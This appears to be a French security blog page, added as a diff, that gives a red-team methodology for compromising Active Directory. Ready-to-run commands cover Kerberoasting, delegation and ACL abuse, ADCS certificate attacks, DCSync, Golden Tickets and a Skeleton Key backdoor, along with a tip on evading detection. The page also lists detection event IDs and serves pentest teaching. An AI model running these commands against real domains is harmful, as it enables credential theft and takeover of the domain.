@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Active Directory : Du foothold au Domain Admin | Blog</title>
+    <meta name="description"
+        content="Guide des attaques Active Directory : énumération, Kerberoasting, DCSync, et chemins vers Domain Admin.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+        integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer">
+    <style>
+        :root {
+            --primary: #00d4ff;
+            --accent: #ff6b6b;
+            --warning: #ffaa00;
+            --success: #00ff88;
+            --bg: #0a0a0a;
+            --bg-terminal: #0d0d0d;
+            --text: #e4e4e7;
+            --text-secondary: #a1a1aa;
+            --text-muted: #71717a;
+            --border: #27272a;
+            --critical: #ff4444;
+            --purple: #a855f7;
+            --orange: #f97316;
+        }
+
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.8;
+        }
+
+        .container {
+            max-width: 850px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+            background: rgba(10, 10, 10, 0.95);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border);
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 24px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+
+        .logo {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--primary);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 1.75rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        main {
+            padding-top: 100px;
+            padding-bottom: 60px;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--text-secondary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .article-hero {
+            background: linear-gradient(135deg, rgba(249, 115, 22, 0.1) 0%, rgba(0, 0, 0, 0) 50%);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 2.5rem;
+            margin-bottom: 2.5rem;
+            position: relative;
+        }
+
+        .article-hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--orange), var(--warning));
+        }
+
+        .article-meta {
+            display: flex;
+            gap: 0.75rem;
+            margin-bottom: 1.25rem;
+            flex-wrap: wrap;
+        }
+
+        .article-date {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            color: var(--primary);
+            background: rgba(0, 212, 255, 0.15);
+            padding: 0.35rem 0.75rem;
+            border-radius: 6px;
+        }
+
+        .article-tag {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            color: var(--orange);
+            background: rgba(249, 115, 22, 0.15);
+            padding: 0.25rem 0.6rem;
+            border-radius: 4px;
+            text-transform: uppercase;
+        }
+
+        .article-tag.offensive {
+            color: var(--critical);
+            background: rgba(255, 68, 68, 0.15);
+        }
+
+        .article-tag.windows {
+            color: var(--primary);
+            background: rgba(0, 212, 255, 0.15);
+        }
+
+        .article-hero h1 {
+            font-size: 2rem;
+            line-height: 1.25;
+            margin-bottom: 1rem;
+        }
+
+        .article-hero .subtitle {
+            color: var(--text-secondary);
+            font-size: 1.1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .hero-stats {
+            display: flex;
+            gap: 2rem;
+            flex-wrap: wrap;
+            padding-top: 1.25rem;
+            border-top: 1px solid var(--border);
+        }
+
+        .hero-stat {
+            text-align: center;
+        }
+
+        .hero-stat-value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: var(--orange);
+        }
+
+        .hero-stat-value.warning {
+            color: var(--warning);
+        }
+
+        .hero-stat-value.success {
+            color: var(--success);
+        }
+
+        .hero-stat-label {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+        }
+
+        .article-content h2 {
+            font-size: 1.4rem;
+            margin: 2.5rem 0 1rem;
+            color: var(--primary);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 0.5rem;
+        }
+
+        .article-content h3 {
+            font-size: 1.15rem;
+            margin: 1.5rem 0 0.75rem;
+        }
+
+        .article-content p {
+            margin-bottom: 1rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content ul,
+        .article-content ol {
+            margin: 1rem 0;
+            padding-left: 1.5rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content li {
+            margin-bottom: 0.5rem;
+        }
+
+        .article-content pre {
+            background: var(--bg-terminal);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+        }
+
+        .article-content code {
+            font-family: 'JetBrains Mono', monospace;
+            background: rgba(0, 212, 255, 0.1);
+            padding: 0.15rem 0.4rem;
+            border-radius: 3px;
+            font-size: 0.9rem;
+        }
+
+        .article-content pre code {
+            background: none;
+            padding: 0;
+        }
+
+        .warning-box {
+            background: rgba(255, 68, 68, 0.1);
+            border: 1px solid rgba(255, 68, 68, 0.3);
+            border-radius: 8px;
+            padding: 1rem 1.25rem;
+            margin: 1.5rem 0;
+        }
+
+        .warning-box strong {
+            color: var(--critical);
+        }
+
+        .info-box {
+            background: rgba(0, 212, 255, 0.1);
+            border-left: 3px solid var(--primary);
+            padding: 1rem;
+            border-radius: 0 8px 8px 0;
+            margin: 1.5rem 0;
+        }
+
+        .orange-box {
+            background: rgba(249, 115, 22, 0.1);
+            border-left: 3px solid var(--orange);
+            padding: 1rem;
+            border-radius: 0 8px 8px 0;
+            margin: 1.5rem 0;
+        }
+
+        .attack-path {
+            background: var(--bg-terminal);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            text-align: center;
+        }
+
+        .attack-path-flow {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+
+        .attack-path-node {
+            background: rgba(249, 115, 22, 0.2);
+            border: 1px solid var(--orange);
+            padding: 0.5rem 1rem;
+            border-radius: 6px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            color: var(--orange);
+        }
+
+        .attack-path-node.target {
+            background: rgba(255, 68, 68, 0.2);
+            border-color: var(--critical);
+            color: var(--critical);
+        }
+
+        .attack-path-arrow {
+            color: var(--text-muted);
+            font-size: 1.2rem;
+        }
+
+        .mitre-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+            font-size: 0.9rem;
+        }
+
+        .mitre-table th,
+        .mitre-table td {
+            border: 1px solid var(--border);
+            padding: 0.75rem;
+            text-align: left;
+        }
+
+        .mitre-table th {
+            background: rgba(249, 115, 22, 0.2);
+            color: var(--orange);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+        }
+
+        .mitre-table td {
+            color: var(--text-secondary);
+        }
+
+        .mitre-table code {
+            font-size: 0.75rem;
+        }
+
+        .tool-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+
+        .tool-card {
+            background: var(--bg-terminal);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+            text-align: center;
+        }
+
+        .tool-card i {
+            font-size: 1.5rem;
+            color: var(--orange);
+            margin-bottom: 0.5rem;
+        }
+
+        .tool-card h4 {
+            color: var(--text);
+            font-size: 0.95rem;
+            margin-bottom: 0.25rem;
+        }
+
+        .tool-card p {
+            font-size: 0.75rem;
+            margin-bottom: 0;
+            color: var(--text-muted);
+        }
+
+        .timeline {
+            margin: 1.5rem 0;
+            padding-left: 1.5rem;
+            border-left: 2px solid var(--border);
+        }
+
+        .timeline-item {
+            margin-bottom: 1rem;
+            position: relative;
+        }
+
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            left: -1.65rem;
+            top: 0.5rem;
+            width: 10px;
+            height: 10px;
+            background: var(--orange);
+            border-radius: 50%;
+        }
+
+        .timeline-date {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            color: var(--orange);
+        }
+
+        footer {
+            padding: 1.5rem 0;
+            border-top: 1px solid var(--border);
+            text-align: center;
+        }
+
+        footer p {
+            color: var(--text-muted);
+            font-size: 0.8rem;
+        }
+
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+
+            .article-hero h1 {
+                font-size: 1.5rem;
+            }
+
+            .mitre-table {
+                font-size: 0.75rem;
+            }
+
+            .attack-path-flow {
+                flex-direction: column;
+            }
+
+            .attack-path-arrow {
+                transform: rotate(90deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <nav>
+            <a href="../index.html" class="logo">AB_</a>
+            <ul class="nav-links">
+                <li><a href="../index.html">Accueil</a></li>
+                <li><a href="../blog.html">Blog</a></li>
+                <li><a href="../index.html#contact">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main class="container">
+        <a href="../blog.html" class="back-link"><i class="fas fa-arrow-left"></i> Retour aux articles</a>
+
+        <article>
+            <div class="article-hero">
+                <div class="article-meta">
+                    <span class="article-date"><i class="fas fa-calendar"></i> 2025-01-01</span>
+                    <span class="article-tag">Active Directory</span>
+                    <span class="article-tag offensive">Offensive</span>
+                    <span class="article-tag windows">Windows</span>
+                </div>
+                <h1>Active Directory : Du foothold au Domain Admin</h1>
+                <p class="subtitle">Méthodologie complète d'attaque AD : énumération, Kerberoasting, délégation, ACL
+                    abuse, et techniques de compromission de domaine.</p>
+                <div class="hero-stats">
+                    <div class="hero-stat">
+                        <div class="hero-stat-value">95%</div>
+                        <div class="hero-stat-label">Entreprises avec AD</div>
+                    </div>
+                    <div class="hero-stat">
+                        <div class="hero-stat-value warning">Kerberos</div>
+                        <div class="hero-stat-label">Protocole ciblé</div>
+                    </div>
+                    <div class="hero-stat">
+                        <div class="hero-stat-value success">BloodHound</div>
+                        <div class="hero-stat-label">Outil clé</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="article-content">
+                <div class="warning-box">
+                    <strong><i class="fas fa-exclamation-triangle"></i> Avertissement légal</strong> —
+                    Ces techniques sont destinées aux tests d'intrusion autorisés et aux exercices Red Team. Toute
+                    utilisation non autorisée constitue une infraction pénale.
+                </div>
+
+                <h2>Pourquoi cibler Active Directory ?</h2>
+                <p>Active Directory (AD) est le système d'identité central de la majorité des entreprises. Compromettre
+                    AD signifie contrôler l'ensemble du SI : comptes utilisateurs, serveurs, politiques de sécurité, et
+                    accès aux ressources.</p>
+
+                <div class="attack-path">
+                    <p style="color: var(--text-muted); font-size: 0.8rem; margin-bottom: 1rem;">Chemin d'attaque
+                        typique</p>
+                    <div class="attack-path-flow">
+                        <span class="attack-path-node">Foothold</span>
+                        <span class="attack-path-arrow">→</span>
+                        <span class="attack-path-node">Enum AD</span>
+                        <span class="attack-path-arrow">→</span>
+                        <span class="attack-path-node">Privesc Local</span>
+                        <span class="attack-path-arrow">→</span>
+                        <span class="attack-path-node">Lateral Mov.</span>
+                        <span class="attack-path-arrow">→</span>
+                        <span class="attack-path-node target">Domain Admin</span>
+                    </div>
+                </div>
+
+                <h2>Outils essentiels</h2>
+                <div class="tool-grid">
+                    <div class="tool-card">
+                        <i class="fas fa-project-diagram"></i>
+                        <h4>BloodHound</h4>
+                        <p>Cartographie des chemins d'attaque AD</p>
+                    </div>
+                    <div class="tool-card">
+                        <i class="fas fa-dog"></i>
+                        <h4>Impacket</h4>
+                        <p>Suite d'outils Python pour protocoles Windows</p>
+                    </div>
+                    <div class="tool-card">
+                        <i class="fas fa-cat"></i>
+                        <h4>Mimikatz</h4>
+                        <p>Extraction de credentials Windows</p>
+                    </div>
+                    <div class="tool-card">
+                        <i class="fas fa-network-wired"></i>
+                        <h4>Rubeus</h4>
+                        <p>Attaques Kerberos en C#</p>
+                    </div>
+                    <div class="tool-card">
+                        <i class="fas fa-search"></i>
+                        <h4>PowerView</h4>
+                        <p>Énumération AD via PowerShell</p>
+                    </div>
+                    <div class="tool-card">
+                        <i class="fas fa-shield-alt"></i>
+                        <h4>Certipy</h4>
+                        <p>Attaques AD Certificate Services</p>
+                    </div>
+                </div>
+
+                <h2>Phase 1 : Énumération Active Directory</h2>
+                <p>L'énumération est cruciale. Un utilisateur de domaine standard suffit pour cartographier l'ensemble
+                    de l'AD.</p>
+
+                <h3>Collecte BloodHound</h3>
+                <pre><code># SharpHound (collector .NET)
+.\SharpHound.exe -c All --zipfilename bloodhound.zip
+
+# BloodHound Python (depuis Linux)
+bloodhound-python -u user -p 'Password123' -d corp.local -ns 192.168.1.1 -c All
+
+# Rusthound (plus rapide, écrit en Rust)
+rusthound -d corp.local -u user -p 'Password123' -o output.json</code></pre>
+
+                <div class="info-box">
+                    <strong>BloodHound CE :</strong> La nouvelle version Community Edition utilise une base Neo4j
+                    modernisée et offre de meilleures performances sur les grands environnements.
+                </div>
+
+                <h3>Énumération PowerView</h3>
+                <pre><code># Import du module
+Import-Module .\PowerView.ps1
+
+# Énumération du domaine
+Get-Domain
+Get-DomainController
+
+# Utilisateurs et groupes privilégiés
+Get-DomainUser -AdminCount | Select-Object samaccountname
+Get-DomainGroup -Identity "Domain Admins" | Get-DomainGroupMember
+
+# Trouver les machines où l'utilisateur courant est admin local
+Find-LocalAdminAccess
+
+# GPO intéressantes
+Get-DomainGPO | Where-Object { $_.displayname -like "*password*" }</code></pre>
+
+                <h3>Énumération LDAP manuelle</h3>
+                <pre><code># Avec ldapsearch (Linux)
+ldapsearch -x -H ldap://192.168.1.1 -D "user@corp.local" -w 'Password123' \
+    -b "DC=corp,DC=local" "(objectClass=user)" samAccountName
+
+# Trouver les comptes avec SPN (cibles Kerberoasting)
+ldapsearch -x -H ldap://192.168.1.1 -D "user@corp.local" -w 'Password123' \
+    -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" samAccountName servicePrincipalName</code></pre>
+
+                <h2>Phase 2 : Attaques Kerberos</h2>
+                <p>Kerberos est le protocole d'authentification d'AD. Ses faiblesses de conception permettent plusieurs
+                    attaques dévastatrices.</p>
+
+                <table class="mitre-table">
+                    <thead>
+                        <tr>
+                            <th>Attaque</th>
+                            <th>MITRE ID</th>
+                            <th>Prérequis</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Kerberoasting</td>
+                            <td><code>T1558.003</code></td>
+                            <td>Compte domaine standard</td>
+                        </tr>
+                        <tr>
+                            <td>AS-REP Roasting</td>
+                            <td><code>T1558.004</code></td>
+                            <td>Aucun (liste d'utilisateurs)</td>
+                        </tr>
+                        <tr>
+                            <td>Pass-the-Ticket</td>
+                            <td><code>T1550.003</code></td>
+                            <td>Ticket Kerberos volé</td>
+                        </tr>
+                        <tr>
+                            <td>Golden Ticket</td>
+                            <td><code>T1558.001</code></td>
+                            <td>Hash KRBTGT</td>
+                        </tr>
+                        <tr>
+                            <td>Silver Ticket</td>
+                            <td><code>T1558.002</code></td>
+                            <td>Hash compte de service</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>Kerberoasting</h3>
+                <p>Demander des tickets de service (TGS) pour les comptes avec SPN, puis cracker offline le hash du mot
+                    de passe.</p>
+
+                <pre><code># Avec Rubeus (Windows)
+.\Rubeus.exe kerberoast /outfile:hashes.txt
+
+# Avec Impacket (Linux)
+impacket-GetUserSPNs corp.local/user:Password123 -dc-ip 192.168.1.1 -outputfile hashes.txt
+
+# Cracking avec Hashcat
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <h3>AS-REP Roasting</h3>
+                <p>Cibler les comptes avec "Do not require Kerberos preauthentication" activé.</p>
+
+                <pre><code># Avec Impacket
+impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 192.168.1.1 -format hashcat
+
+# Avec Rubeus
+.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+
+# Cracking
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <div class="orange-box">
+                    <strong>Conseil OPSEC :</strong> Kerberoasting génère des événements 4769 (TGS request). Limiter le
+                    nombre de requêtes et espacer dans le temps pour éviter la détection.
+                </div>
+
+                <h2>Phase 3 : Abus de délégation Kerberos</h2>
+                <p>La délégation Kerberos permet à un service d'agir au nom d'un utilisateur. Mal configurée, elle offre
+                    des chemins vers Domain Admin.</p>
+
+                <h3>Unconstrained Delegation</h3>
+                <pre><code># Trouver les machines avec unconstrained delegation
+Get-DomainComputer -Unconstrained | Select-Object dnshostname
+
+# Extraire les tickets en cache (sur la machine compromise)
+mimikatz # sekurlsa::tickets /export
+
+# Attendre qu'un admin se connecte, puis utiliser son TGT
+.\Rubeus.exe monitor /interval:5</code></pre>
+
+                <h3>Constrained Delegation</h3>
+                <pre><code># Trouver les comptes avec constrained delegation
+Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
+Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto
+
+# S4U2Self + S4U2Proxy pour impersonation
+.\Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc01.corp.local /ptt</code></pre>
+
+                <h3>Resource-Based Constrained Delegation (RBCD)</h3>
+                <pre><code># Si on contrôle un compte machine (ou qu'on peut en créer un)
+# Et qu'on a WriteDacl sur une cible
+
+# Créer un compte machine
+impacket-addcomputer corp.local/user:Password123 -computer-name 'FAKE$' -computer-pass 'FakePass123'
+
+# Configurer RBCD sur la cible
+impacket-rbcd corp.local/user:Password123 -delegate-from 'FAKE$' -delegate-to 'TARGET$' -action write
+
+# S4U attack
+impacket-getST -spn cifs/target.corp.local -impersonate Administrator corp.local/'FAKE$':'FakePass123'</code></pre>
+
+                <h2>Phase 4 : Abus des ACLs</h2>
+                <p>Les Access Control Lists mal configurées offrent des chemins d'escalade subtils mais puissants.</p>
+
+                <table class="mitre-table">
+                    <thead>
+                        <tr>
+                            <th>Droit</th>
+                            <th>Exploitation</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>GenericAll</code></td>
+                            <td>Contrôle total : reset password, ajout au groupe, etc.</td>
+                        </tr>
+                        <tr>
+                            <td><code>GenericWrite</code></td>
+                            <td>Modifier attributs : ajouter SPN pour Kerberoast, modifier script logon</td>
+                        </tr>
+                        <tr>
+                            <td><code>WriteDacl</code></td>
+                            <td>Modifier les ACLs : s'accorder GenericAll</td>
+                        </tr>
+                        <tr>
+                            <td><code>WriteOwner</code></td>
+                            <td>Devenir propriétaire puis modifier les ACLs</td>
+                        </tr>
+                        <tr>
+                            <td><code>ForceChangePassword</code></td>
+                            <td>Reset le mot de passe sans connaître l'ancien</td>
+                        </tr>
+                        <tr>
+                            <td><code>AddMember</code></td>
+                            <td>S'ajouter à un groupe privilégié</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <pre><code># Avec PowerView : trouver les ACLs exploitables
+Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -eq "user" }
+
+# Reset password d'un utilisateur (si ForceChangePassword)
+Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
+
+# S'ajouter au groupe Domain Admins (si AddMember)
+Add-DomainGroupMember -Identity "Domain Admins" -Members "attacker"
+
+# Avec bloodyAD (Linux)
+bloodyAD -d corp.local -u user -p 'Password123' --host 192.168.1.1 set password target_user 'NewPass123!'</code></pre>
+
+                <h2>Phase 5 : AD Certificate Services (ADCS)</h2>
+                <p>ADCS est souvent mal configuré et offre des chemins directs vers Domain Admin.</p>
+
+                <div class="warning-box">
+                    <strong><i class="fas fa-certificate"></i> ESC1-ESC8</strong> —
+                    Les vulnérabilités ADCS (ESC1 à ESC8) permettent d'obtenir des certificats pour n'importe quel
+                    utilisateur, y compris Domain Admin.
+                </div>
+
+                <pre><code># Énumération avec Certipy
+certipy find -u user@corp.local -p 'Password123' -dc-ip 192.168.1.1 -vulnerable
+
+# ESC1 : Template vulnérable (enrollee peut spécifier le SAN)
+certipy req -u user@corp.local -p 'Password123' -ca CORP-CA -target ca.corp.local \
+    -template VulnerableTemplate -upn administrator@corp.local
+
+# Authentification avec le certificat
+certipy auth -pfx administrator.pfx -dc-ip 192.168.1.1
+
+# ESC8 : NTLM Relay vers HTTP enrollment
+certipy relay -ca ca.corp.local -template DomainController</code></pre>
+
+                <h2>Phase 6 : Compromission du domaine</h2>
+                <p>Une fois Domain Admin obtenu, plusieurs techniques permettent d'assurer la persistence.</p>
+
+                <h3>DCSync</h3>
+                <pre><code># Extraire tous les hashes du domaine
+impacket-secretsdump corp.local/administrator:Password123@192.168.1.1
+
+# Avec Mimikatz
+mimikatz # lsadump::dcsync /domain:corp.local /all /csv
+
+# Cibler un compte spécifique (plus discret)
+mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt</code></pre>
+
+                <h3>Golden Ticket</h3>
+                <pre><code># Créer un Golden Ticket (persistence ultime)
+mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local \
+    /sid:S-1-5-21-DOMAIN-SID /krbtgt:KRBTGT-HASH /ptt
+
+# Avec Impacket
+impacket-ticketer -nthash KRBTGT-HASH -domain-sid S-1-5-21-DOMAIN-SID \
+    -domain corp.local FakeAdmin</code></pre>
+
+                <h3>Skeleton Key</h3>
+                <pre><code># Injecter une backdoor dans LSASS du DC (mot de passe universel: mimikatz)
+mimikatz # privilege::debug
+mimikatz # misc::skeleton
+
+# Tout utilisateur peut maintenant s'authentifier avec "mimikatz" comme mot de passe</code></pre>
+
+                <div class="warning-box">
+                    <strong><i class="fas fa-skull-crossbones"></i> Attention</strong> —
+                    Skeleton Key et DCSync sont très bruyants. Utiliser avec précaution en Red Team et documenter pour
+                    le rapport.
+                </div>
+
+                <h2>Détection & Défense</h2>
+                <p>Connaître les indicateurs de compromission permet de mieux simuler un adversaire réaliste.</p>
+
+                <table class="mitre-table">
+                    <thead>
+                        <tr>
+                            <th>Attaque</th>
+                            <th>Event ID</th>
+                            <th>Indicateur</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Kerberoasting</td>
+                            <td><code>4769</code></td>
+                            <td>Nombreuses requêtes TGS, encryption RC4</td>
+                        </tr>
+                        <tr>
+                            <td>AS-REP Roasting</td>
+                            <td><code>4768</code></td>
+                            <td>Preauth disabled, encryption RC4</td>
+                        </tr>
+                        <tr>
+                            <td>DCSync</td>
+                            <td><code>4662</code></td>
+                            <td>Replication rights depuis non-DC</td>
+                        </tr>
+                        <tr>
+                            <td>Golden Ticket</td>
+                            <td><code>4769</code></td>
+                            <td>TGT avec durée anormale, SID mismatch</td>
+                        </tr>
+                        <tr>
+                            <td>Password Spray</td>
+                            <td><code>4771</code></td>
+                            <td>Nombreux échecs depuis même source</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h2>Ressources & Références</h2>
+                <ul>
+                    <li><a href="https://bloodhound.readthedocs.io/" target="_blank" rel="noopener">BloodHound
+                            Documentation</a></li>
+                    <li><a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener">Certipy - ADCS
+                            Attacks</a></li>
+                    <li><a href="https://adsecurity.org/" target="_blank" rel="noopener">ADSecurity.org - Sean
+                            Metcalf</a></li>
+                    <li><a href="https://www.thehacker.recipes/" target="_blank" rel="noopener">The Hacker Recipes</a>
+                    </li>
+                    <li><a href="https://attack.mitre.org/tactics/TA0006/" target="_blank" rel="noopener">MITRE ATT&CK -
+                            Credential Access</a></li>
+                    <li><a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet"
+                            target="_blank" rel="noopener">AD Exploitation Cheat Sheet</a></li>
+                </ul>
+            </div>
+        </article>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>© 2025 Abdelaaziz Belkhair</p>
+        </div>
+    </footer>
+</body>
+
+</html>
